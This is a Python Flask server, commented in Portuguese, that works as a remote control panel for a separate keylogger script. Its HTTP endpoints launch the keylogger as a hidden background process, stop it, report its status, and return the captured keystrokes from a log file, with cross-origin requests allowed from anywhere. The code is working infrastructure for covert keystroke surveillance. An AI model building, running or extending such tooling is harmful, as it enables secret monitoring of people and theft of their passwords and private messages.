from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import os
import threading
import sys

app = Flask(__name__)
CORS(app)  # Permite requisições do navegador

# Caminho do script que será executado
SCRIPT_PATH = os.path.join(os.path.dirname(__file__), 'keylogger.py')

# Processo do keylogger em execução
keylogger_process = None

@app.route('/api/execute', methods=['POST'])
def execute_script():
    """Executa o keylogger.py em background"""
    global keylogger_process
    
    try:
        data = request.json or {}
        
        # Verifica se já está rodando
        if keylogger_process and keylogger_process.poll() is None:
            return jsonify({
                'success': False,
                'message': 'Keylogger já está em execução',
                'pid': keylogger_process.pid
            }), 400
        
        # Obtém o interpretador Python atual
        python_exe = sys.executable
        
        # Executa o script em background
        keylogger_process = subprocess.Popen(
            [python_exe, SCRIPT_PATH],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        
        return jsonify({
            'success': True,
            'message': 'Keylogger iniciado com sucesso',
            'pid': keylogger_process.pid,
            'script': SCRIPT_PATH
        })
        
    except FileNotFoundError:
        return jsonify({
            'success': False,
            'message': f'Arquivo não encontrado: {SCRIPT_PATH}'
        }), 404
        
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao executar: {str(e)}'
        }), 500

@app.route('/api/stop', methods=['POST'])
def stop_script():
    """Para o keylogger em execução"""
    global keylogger_process
    
    try:
        if keylogger_process and keylogger_process.poll() is None:
            keylogger_process.terminate()
            keylogger_process.wait(timeout=5)
            
            return jsonify({
                'success': True,
                'message': 'Keylogger parado com sucesso'
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Keylogger não está em execução'
            }), 400
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao parar: {str(e)}'
        }), 500

@app.route('/api/status', methods=['GET'])
def get_status():
    """Verifica status do keylogger"""
    global keylogger_process
    
    is_running = keylogger_process and keylogger_process.poll() is None
    
    return jsonify({
        'running': is_running,
        'pid': keylogger_process.pid if is_running else None,
        'script': SCRIPT_PATH
    })

@app.route('/api/log', methods=['GET'])
def get_log():
    """Retorna o conteúdo do arquivo de log"""
    log_file = os.path.join(os.path.dirname(__file__), 'captured_keys.txt')
    
    try:
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            return jsonify({
                'success': True,
                'content': content,
                'size': len(content)
            })
        else:
            return jsonify({
                'success': False,
                'message': 'Arquivo de log não encontrado'
            }), 404
            
    except Exception as e:
        return jsonify({
            'success': False,
            'message': f'Erro ao ler log: {str(e)}'
        }), 500

if __name__ == '__main__':
    print('🚀 Servidor iniciado em http://localhost:5000')
    print('⚠️  AVISO: Este servidor executa o keylogger.py')
    print('📌 Endpoints disponíveis:')
    print('   POST /api/execute - Inicia o keylogger')
    print('   POST /api/stop    - Para o keylogger')
    print('   GET  /api/status  - Status do keylogger')
    print('   GET  /api/log     - Conteúdo capturado')
    print('\nPressione Ctrl+C para parar o servidor\n')
    
    app.run(debug=True, port=5000)
